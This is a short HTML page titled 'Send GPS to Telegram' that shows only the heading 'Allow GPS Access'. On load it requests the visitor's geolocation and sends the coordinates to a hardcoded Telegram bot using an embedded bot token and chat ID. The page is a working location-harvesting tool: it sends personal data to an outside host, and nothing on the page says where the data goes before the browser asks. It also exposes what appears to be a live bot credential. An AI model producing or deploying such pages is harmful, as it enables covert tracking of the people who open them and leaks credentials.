<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Send GPS to Telegram</title>
</head>
<body>
<h1>Allow GPS Access</h1>
<script>
  const BOT_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
  const CHAT_ID = "6978055162";

  function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
    fetch(url)
      .then(res => {
        if(res.ok) alert("Location sent to Telegram!");
        else alert("Failed to send location.");
      })
      .catch(() => alert("Error sending location."));
  }

  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const msg = `User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
        sendToTelegram(msg);
      },
      () => alert("GPS access denied or unavailable.")
    );
  } else {
    alert("Geolocation not supported.");
  }
</script>
</body>
</html>
